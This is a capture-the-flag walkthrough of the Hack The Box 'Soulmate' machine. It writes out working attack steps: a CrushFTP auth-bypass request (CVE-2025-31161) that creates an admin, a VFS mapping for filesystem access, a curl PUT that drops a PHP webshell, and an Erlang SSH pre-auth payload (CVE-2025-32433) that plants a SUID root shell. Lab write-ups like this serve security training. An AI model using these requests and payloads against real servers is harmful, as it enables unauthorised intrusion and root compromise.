# Soulmate — Hack The Box, Easy, Linux

**TL;DR:** A `ftp.` vhost runs CrushFTP 11.x, vulnerable to CVE-2025-31161 — an
S3-`Authorization`-header auth bypass that yields WebInterface admin with no
password. The admin can map the OS filesystem into a user's VFS (`file:///`),
giving arbitrary read/write **as root inside the CrushFTP container**. The PHP
app's document root is bind-mounted into that container, so a plain `PUT` drops a
webshell straight into the webroot — past the app's own `.png` upload filter —
for code execution as `www-data`. A custom **Erlang/OTP 27.3.2 SSH** service runs
as root on `127.0.0.1:2222`; CVE-2025-32433 (pre-auth `exec`) runs `os:cmd` as
root, and a SUID `bash` finishes the job.

## 1. Recon

TCP: `22` (OpenSSH 8.9p1, Ubuntu) and `80` (nginx). `/` 302-redirects to
`http://soulmate.htb/`, a small PHP dating site (register / login / profile /
dashboard). Vhost fuzzing finds one more name:

```
ffuf -u http://10.129.x.x/ -H 'Host: FUZZ.soulmate.htb' -w subdomains-top1m.txt -fs 154
→ ftp
```

`ftp.soulmate.htb` serves a **CrushFTP** WebInterface, build `11.W.657-2025_03_08`
(an 11.x from March 2025).

## 2. Foothold — CVE-2025-31161 (CrushFTP auth bypass)

CrushFTP 11.x < 11.3.1 mis-parses the S3 `Authorization` header. Presenting a
self-chosen `CrushAuth` session cookie together with
`Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/` binds the anonymous
session to that user with no password check. One `setUserItem` call then creates
a new admin:

```
Cookie: currentAuth=<c2f>; CrushAuth=<epoch>_<random+c2f>
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
POST /WebInterface/function/  command=setUserItem&data_action=replace&username=pwn&user=<xml admin=true>&…
```

Admin, but the WebInterface is deliberately jailed: crushadmin's VFS is empty and
`getXMLListing`/`download` can't see the OS.

## 3. Admin → arbitrary host filesystem (VFS `file:///`)

The intended admin primitive is to give a user a VFS mount onto the real
filesystem. The `vfs_items` schema is fiddly — the vector form NPEs until you get
it *exactly* right. The authoritative structure comes from the admin UI's own
`crushftp.WI.FileBrowser.js` (reading the client that builds the request beats
guessing):

```
command=setUserItem&data_action=update_vfs&xmlItem=user&username=pwn
&vfs_items=<vfs_items type="vector"><vfs_items_subitem type="properties">
   <name>osroot</name><path>/</path>
   <vfs_item type="vector"><vfs_item_subitem type="properties">
     <type>DIR</type><url>file:///</url>
   </vfs_item_subitem></vfs_item>
 </vfs_items_subitem></vfs_items>
&permissions=<VFS type="properties"><item name="/osroot/">(read)(write)(view)(delete)(resume)(makedir)(deletedir)(rename)</item></VFS>
```

Now `/osroot/` lists the whole filesystem — an Alpine/Wolfi (apko) container
running CrushFTP **as root**. Read files with `command=download` +
`POST /D/<id>~<n>` chunks. `/proc/1/mountinfo` shows the host bind mounts:

```
/var/www/soulmate.htb/public  → /app/webProd
/opt/crushftp/volume          → /app/CrushFTP11
```

`/app/CrushFTP11/users/MainUsers/*/user.XML` holds the CrushFTP password hashes
(plain unsalted SHA512 — confirmed by hashing a known account and matching), and
`/app/CrushFTP11/passfile` holds crushadmin's cleartext `04E2xAXYFfDsEYtu`.
Neither ben's nor jenna's hash cracks (rockyou + rules), and none of these creds
are reused on host SSH — a deliberate dead end.

## 4. www-data — write a webshell past the upload filter

`/app/webProd` is the Soulmate PHP source, bind-mounted from the host's
`/var/www/soulmate.htb/public`. The app's `profile.php` upload forces
`<uid>_<ts>.png` (extension whitelist), but the directory is writable through
CrushFTP as root. Skip the finicky chunked `openFile`/`/U/` upload (it delivered
0 bytes through nginx) and use the documented direct **`PUT`** with Basic auth:

```
curl -u pwn:pass -T shell.php http://ftp.soulmate.htb/osroot/app/webProd/pwn.php
→ 201
curl 'http://soulmate.htb/pwn.php?c=id'   → uid=33(www-data)
```

A root-owned `clean-web.sh` runs `inotifywait -m -e create` on the webroot and
deletes new files, so the shell must be re-dropped periodically.

## 5. www-data → root — CVE-2025-32433 (Erlang/OTP SSH pre-auth RCE)

`ps` shows a custom Erlang login service running as **root**:

```
root  /usr/local/lib/erlang_login/start.escript … -sname ssh_runner …
ss -ltnp → 127.0.0.1:2222   banner: SSH-2.0-Erlang/5.2.9   OTP 27.3.2
```

Erlang/OTP SSH ≤ 27.3.2 accepts connection-protocol messages before
authentication (CVE-2025-32433, fixed 27.3.3): open a session channel and send an
`exec` request, and the server runs the Erlang term as root. Run the PoC from the
www-data webshell against localhost, executing `os:cmd` to drop a SUID bash:

```
os:cmd("cp /bin/bash /tmp/.rb; chmod 6755 /tmp/.rb").
```

```
/tmp/.rb -p -c 'id; cat /home/ben/user.txt; cat /root/root.txt'
→ euid=0(root)
→ user.txt: <user flag redacted>
→ root.txt: <root flag redacted>
```

## Takeaways

- **Two current public CVEs stacked.** CrushFTP auth bypass (foothold) and
  Erlang/OTP SSH pre-auth RCE (root) are both 2025 CVEs with public PoCs. Pinning
  exact versions and hunting CVEs/PoCs *first* is what this box rewards; neither
  is visible from banners alone without checking the version against an advisory.
- **A forced-extension upload filter is only as strong as the weakest writer to
  that directory.** The webroot was a container bind-mount that a *different*
  root service could write arbitrarily — the app's own `.png` check was
  irrelevant. After any foothold, check `/proc/1/mountinfo` and enumerate every
  service that can write the docroot.
- **When an admin API's request body keeps erroring, read the product's own
  front-end JS.** The exact `vfs_items` XML came verbatim from the WebInterface
  bundle; trial-and-error on the schema was the single biggest time sink.
- **An odd root-owned service on a localhost-only port is the privesc.**
  `ss -ltnp` after every foothold; a banner that names its framework
  (`SSH-2.0-Erlang`) hands you the CVE.
